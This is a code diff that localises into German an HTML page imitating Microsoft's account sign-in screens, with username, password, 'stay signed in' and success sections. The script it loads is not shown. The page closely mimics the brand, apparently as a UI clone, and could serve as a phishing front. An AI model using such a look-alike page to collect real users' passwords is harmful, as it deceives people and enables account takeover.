@@ -1,41 +1,54 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="de">
 
 <head>
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="icon" href="assets/favicon.ico" />
-    <title>Sign in to your Microsoft account</title>
+    <title>Bei Ihrem Microsoft-Konto anmelden</title>
     <link rel="stylesheet" href="assets/app.css" />
+    <style>
+        /* Vollflächiger SVG-Hintergrund aus assets/bg.svg */
+        html, body {
+            min-height: 100%;
+        }
+        body {
+            background: #f2f2f2 url("assets/bg.svg") center center / cover no-repeat fixed;
+        }
+    </style>
 </head>
 
 <body>
     <section id="section_uname">
         <div class="auth-wrapper">
             <img src="assets/logo.png" alt="Microsoft" />
-            <h2 class="title mb-16 mt-16">Sign in</h2>
+            <h2 class="title mb-16 mt-16">Anmelden</h2>
             <form>
                 <div class="mb-16">
                     <p id="error_uname" class="error"></p>
-                    <input id="inp_uname" type="text" name="uname" class="input" placeholder="Email, phone, or Skype" />
+                    <input id="inp_uname" type="text" name="uname" class="input"
+                        placeholder="E-Mail, Telefon oder Skype" autocomplete="username" />
                 </div>
             </form>
             <div>
-                <p class="mb-16 fs-13">No account? <a href="" class="link">Create one!</a></p>
+                <p class="mb-16 fs-13">Kein Konto? <a href="" class="link">Erstellen Sie jetzt eins!</a></p>
                 <p class="mb-16 fs-13">
-                    <a href="#" class="link">Sign in with a security key
-                        <img src="assets/question.png" alt="Question img">
+                    <a href="#" class="link">Sie können nicht auf Ihr Konto zugreifen?</a>
+                </p>
+                <p class="mb-16 fs-13">
+                    <a href="#" class="link">Mit einem Sicherheitsschlüssel anmelden
+                        <img src="assets/question.png" alt="Fragezeichen">
                     </a>
                 </p>
             </div>
             <div>
-                <button class="btn" id="btn_next" type="button">Next</button>
+                <button class="btn" id="btn_next" type="button">Weiter</button>
             </div>
         </div>
         <div class="opts">
             <p class="has-icon mb-0" style="font-size:15px;"><span class="icon"><img src="assets/key.png"
-                        width="30px" /></span> Sign-in options</p>
+                        width="30px" /></span> Anmeldeoptionen</p>
         </div>
     </section>
 
@@ -44,25 +57,26 @@
             <img src="assets/logo.png" alt="Microsoft" class="d-block" />
             <div class="identity w-100 mt-16 mb-16">
                 <button class="back" id="btn_back" type="button">
-                    <img src="assets/back.png" />
+                    <img src="assets/back.png" alt="Zurück" />
                 </button>
-                <span id="user_identity_pwd">a@b.com</span>
+                <span id="user_identity">a@b.com</span>
             </div>
-            <h2 class="title mb-16">Enter password</h2>
+            <h2 class="title mb-16">Kennwort eingeben</h2>
             <form>
                 <div class="mb-16">
                     <p id="error_pwd" class="error"></p>
-                    <input id="inp_pwd" type="password" name="pass" class="input" placeholder="Password" />
+                    <input id="inp_pwd" type="password" name="pass" class="input" placeholder="Kennwort"
+                        autocomplete="current-password" />
                 </div>
             </form>
             <div>
-                <p class="mb-16"> <a href="#" class="link fs-13">Forgot password?</a></p>
+                <p class="mb-16"> <a href="#" class="link fs-13">Kennwort vergessen?</a></p>
                 <p class="mb-16">
-                    <a href="#" class="link fs-13">Other ways to sign in</a>
+                    <a href="#" class="link fs-13">Andere Möglichkeiten zum Anmelden</a>
                 </p>
             </div>
             <div>
-                <button class="btn" id="btn_sig" type="button">Sign in</button>
+                <button class="btn" id="btn_sig" type="button">Anmelden</button>
             </div>
         </div>
     </section>
@@ -71,23 +85,37 @@
         <div class="auth-wrapper">
             <img src="assets/logo.png" alt="Microsoft" class="d-block" />
             <div class="identity w-100 mt-16 mb-16">
-                <span id="user_identity_final">a@b.com</span>
+                <span id="user_identity">a@b.com</span>
             </div>
-            <h2 class="title mb-16">Stay signed in?</h2>
-            <p class="p">Stay signed in so you don't have to sign in again next time.</p>
+            <h2 class="title mb-16">Angemeldet bleiben?</h2>
+            <p class="p">Bleiben Sie angemeldet, damit Sie sich beim nächsten Mal nicht erneut anmelden müssen.</p>
             <label class="has-checkbox">
                 <input type="checkbox" class="checkbox" />
-                <span>Don't show this again</span>
+                <span>Nicht mehr anzeigen</span>
             </label>
             <div class="btn-group">
-                <button class="btn btn-sec" id="btn_no" type="button">No</button>
-                <button class="btn" id="btn_yes" type="button">Yes</button>
+                <button class="btn btn-sec" id="btn_no" type="button">Nein</button>
+                <button class="btn" id="btn_yes" type="button">Ja</button>
+            </div>
+        </div>
+    </section>
+
+    <section id="section_success" class="d-none">
+        <div class="auth-wrapper">
+            <img src="assets/logo.png" alt="Microsoft" class="d-block" />
+            <div class="identity w-100 mt-16 mb-16">
+                <span id="user_identity">a@b.com</span>
+            </div>
+            <h2 class="title mb-16">Sie sind angemeldet</h2>
+            <p class="p" id="success_msg">Sie werden angemeldet…</p>
+            <div>
+                <button class="btn" id="btn_restart" type="button">Erneut anmelden</button>
             </div>
         </div>
     </section>
     <footer class="footer">
-        <a href="#">Terms of use</a>
-        <a href="#">Privacy & cookies</a>
+        <a href="#">Nutzungsbedingungen</a>
+        <a href="#">Datenschutz und Cookies</a>
         <span>.&nbsp;.&nbsp;.</span>
     </footer>
     <script src="assets/app.js"></script>
